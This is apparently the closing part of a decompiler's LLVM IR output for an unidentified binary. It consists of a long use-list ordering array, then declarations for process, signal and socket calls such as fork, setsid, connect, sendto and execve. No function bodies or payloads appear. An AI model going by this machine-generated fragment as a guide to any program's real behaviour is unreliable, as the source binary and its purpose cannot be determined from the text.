1674, 1675, 1676, 1667, 1668, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 1684, 33, 1685, 1686, 1687, 1688, 34, 1689, 1690, 35, 1691, 1692, 36, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1707, 1708, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 37, 1725, 1726, 1727, 1728, 38, 1729, 1730, 1731, 1732, 39, 1733, 1734, 1735, 1736, 1737, 1738, 1739, 1740, 1741, 1742, 1743, 1744, 1444, 1445, 1459, 365, 366, 1460, 1461, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 185, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 40, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 135, 103, 1122, 1123, 186, 187, 1124, 1125, 1126, 1127, 188, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 41, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 291, 1144, 56, 189, 1145, 190, 367, 1146, 1147, 1148, 1149, 1150, 1151, 42, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 368, 1159, 1160, 1161, 1162, 191, 1163, 1164, 1165, 43, 1166, 125, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1558, 9, 1559, 1560, 1561, 897, 1562, 1563, 1564, 1565, 1566, 1567, 1175, 1174, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 136, 1446, 1447, 10, 1448, 244, 1191, 245, 1192, 1193, 137, 1194, 1595, 1611, 1612, 1613, 1614, 1312, 1745, 1746, 1747, 1748, 1598, 1749, 1599, 1750, 1751, 192, 1752, 110, 1753, 108, 109, 1754, 1755, 1756, 369, 370, 371, 1760, 372, 1771, 1776, 898, 246, 1777, 373, 1775, 374, 375, 11, 1757, 1758, 376, 193, 1269, 304, 1270, 379, 306, 305, 1271, 1272, 1273, 1274, 378, 1275, 1276, 377, 1277, 1600, 194, 1759, 1003, 1004, 1005, 1006, 1007, 1008, 196, 138, 1009, 1010, 1011, 111, 195, 1012, 197, 1278, 1279, 380, 1284, 381, 946, 139, 947, 140, 948, 198, 1350, 1351, 1352, 1353, 12, 1525, 1526, 13, 949, 950, 899, 80, 951, 342, 952, 383, 1761, 384, 307, 1762, 1763, 1765, 1766, 382, 1617, 1619, 1620, 57, 247, 1621, 1618, 1615, 1616, 14, 956, 959, 957, 958, 248, 15, 1624, 1622, 1623, 249, 199, 960, 961, 962, 963, 1625, 1626, 385, 16, 1627, 200, 1628, 1629, 1630, 1631, 1632, 1633, 17, 18, 1280, 1281, 1282, 1283, 386, 19, 387, 1507, 1508, 887, 1313, 888, 1634, 1570, 1545, 996, 1546, 1509, 1510, 201, 1511, 1515, 1516, 1517, 1518, 388, 1519, 1520, 1587, 202, 203, 1568, 389, 308, 1569, 1772, 204, 20, 205, 206, 1195, 1196, 208, 1197, 390, 207, 1198, 94, 21, 1575, 1576, 1199, 1200, 250, 22, 1201, 1512, 1513, 1514, 23, 1577, 1578, 1579, 24, 1778, 1779, 95, 209, 1202, 1203, 1204, 1205, 1206, 210, 1462, 900, 1463, 126, 141, 1449, 1450, 1457, 1454, 1455, 1456, 251, 1458, 343, 1452, 1451, 252, 1453, 964, 965, 1464, 1465, 966, 967, 1207, 1208, 1209, 1210, 1211, 142, 1212, 1213, 1214, 1215, 1216, 211, 1217, 1219, 1220, 1218, 1221, 143, 1222, 1223, 212, 1224, 213, 292, 391, 1225, 1226, 214, 215, 1227, 1228, 1229, 1230, 1231, 1232, 309, 1233, 1234, 392, 1235, 310, 1237, 220, 1239, 217, 218, 1236, 216, 1238, 1240, 1242, 145, 1243, 1244, 221, 81, 82, 1245, 1246, 144, 393, 1247, 1248, 222, 394, 1249, 1250, 219, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 395, 1262, 113, 86, 1261, 1263, 1264, 1265, 25, 932, 223, 933, 124, 83, 101, 1241, 253, 953, 26, 255, 224, 955, 954, 254, 311, 1774, 1468, 1469, 1470, 84, 1471, 1472, 225, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 165, 1266, 1486, 1426, 1427, 1428, 1429, 1430, 1431, 901, 1635, 1354, 1764, 968, 1571, 1593, 969, 1601, 1767, 114, 1768, 1661, 1773, 1602, 1662, 970, 1603, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 1543, 1604, 1605, 981, 1769, 1770, 27, 1527, 146, 1528, 1529, 237, 236, 902, 115, 116, 117, 118, 904, 903, 59, 58, 147, 1530, 1531, 1532, 1533, 1535, 1534, 28, 1636, 1637, 239, 238, 905, 119, 120, 121, 122, 907, 906, 61, 60, 46, 85, 1638, 908, 29, 1639, 1640, 123, 1641, 1642, 1643, 1644, 1645, 226, 909, 912, 910, 911, 1646, 913, 299, 401, 982, 402, 256, 403, 983, 400, 44, 45, 404, 984, 985, 405, 413, 414, 528, 529, 62, 312, 396, 397, 398, 313, 399, 986, 257, 148, 407, 408, 406, 987, 988, 989, 990, 992, 278, 991, 993, 994, 411, 412, 409, 410, 995, 227, 314, 258, 998, 415, 997, 417, 418, 416, 419, 420, 999, 1000, 344, 1001, 421, 1002, 422, 63, 102, 149, 150, 151, 152, 438, 1013, 315, 316, 423, 317, 1014, 1015, 435, 229, 1016, 1019, 436, 1017, 437, 230, 1018, 262, 1020, 439, 1021, 432, 228, 1022, 1025, 433, 1023, 434, 231, 1024, 261, 1026, 440, 1027, 441, 1028, 442, 1029, 429, 1030, 1033, 430, 1031, 431, 1032, 260, 1034, 1035, 426, 1036, 1039, 427, 1037, 428, 1038, 259, 1040, 425, 443, 1041, 1042, 444, 1043, 1046, 445, 1044, 446, 1045, 263, 1047, 424, 447, 1048, 1049, 448, 1050, 1051, 449, 1052, 1053, 1054, 450, 1055, 1056, 1057, 1058, 1059, 232, 451, 1060, 1061, 96, 87, 452, 233, 1267, 1268, 264, 1290, 300, 1291, 455, 1292, 64, 318, 1293, 1294, 1295, 1302, 454, 1296, 1297, 1298, 1299, 1300, 1301, 265, 1303, 456, 1304, 345, 1305, 1306, 453, 1307, 1308, 1309, 1310, 1311, 153, 1314, 458, 1315, 281, 65, 279, 280, 1316, 1317, 1318, 127, 346, 1319, 459, 1320, 457, 1321, 1322, 1323, 460, 1324, 284, 282, 66, 283, 1325, 1326, 461, 1327, 1328, 462, 1329, 1330, 1331, 319, 464, 465, 463, 466, 914, 915, 489, 916, 917, 918, 919, 488, 920, 921, 922, 923, 487, 924, 925, 926, 927, 484, 485, 467, 928, 486, 483, 266, 267, 929, 930, 475, 931, 476, 477, 478, 479, 480, 481, 482, 889, 1355, 67, 98, 1356, 320, 1357, 468, 469, 470, 471, 472, 473, 474, 68, 88, 97, 490, 491, 1358, 492, 1359, 321, 322, 323, 1521, 347, 1522, 1523, 1524, 99, 154, 155, 69, 70, 234, 1536, 324, 325, 326, 327, 499, 1537, 1539, 1540, 1541, 494, 1542, 495, 496, 497, 493, 268, 498, 1538, 348, 501, 502, 500, 328, 30, 504, 503, 505, 1544, 329, 330, 331, 332, 1547, 1548, 508, 506, 507, 269, 1549, 1550, 1551, 349, 285, 1555, 1556, 333, 1552, 1553, 509, 510, 511, 1554, 513, 514, 515, 516, 517, 512, 270, 518, 1557, 519, 71, 525, 72, 524, 520, 1572, 523, 272, 526, 521, 1573, 522, 271, 527, 73, 89, 1574, 334, 530, 531, 532, 1581, 533, 1580, 535, 536, 534, 537, 538, 1588, 1589, 350, 1590, 1591, 156, 1592, 74, 351, 1594, 273, 539, 540, 541, 542, 1596, 1597, 301, 1606, 1607, 543, 1608, 544, 1609, 1610, 545, 157, 546, 547, 548, 549, 550, 1657, 158, 75, 286, 274, 337, 338, 1647, 1648, 1649, 275, 335, 336, 339, 1650, 1651, 340, 1652, 1653, 277, 76, 159, 160, 276, 1655, 1656, 352, 161, 77, 551, 1654, 1658, 1659, 341, 1660, 934, 935, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 603, 604, 605, 606, 607, 608, 597, 598, 599, 600, 601, 602, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 1789, 1790, 1791, 1792, 1793, 1794 }
  uselistorder i32* @r4, {}
}

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
